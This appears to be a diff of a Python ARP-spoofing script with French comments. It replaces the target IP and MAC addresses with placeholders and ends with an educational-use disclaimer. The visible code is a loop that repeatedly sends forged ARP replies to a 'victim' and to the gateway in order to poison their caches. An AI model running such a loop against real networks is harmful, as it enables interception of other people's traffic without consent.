@@ -45,9 +45,10 @@ else:
     print("Gateway MAC:", mac_gate)
 
 while True:
-    arp_reply(src_ip=get_myip(), src_mac=mac_gate, dst_ip="192.168.1.69", dst_mac="36:77:90:0C:97:88")
+    arp_reply(src_ip=get_myip(), src_mac=mac_gate, dst_ip="XXXXXX", dst_mac="XXXXX")
     print("ARP Reply envoyée à la victime.")
-    arp_reply(src_ip=get_myip(), src_mac="36:77:90:0C:97:95", dst_ip=gw, dst_mac=mac_gate)
+    arp_reply(src_ip=get_myip(), src_mac="3XXXXXXX", dst_ip=gw, dst_mac=mac_gate)
+
 
 
 # Note: Ce code est à des fins éducatives uniquement. L'utilisation de techniques de spoofing ARP peut être illégale et contraire à l'éthique. Assurez-vous d'avoir l'autorisation explicite avant de mener de telles activités sur un réseau.
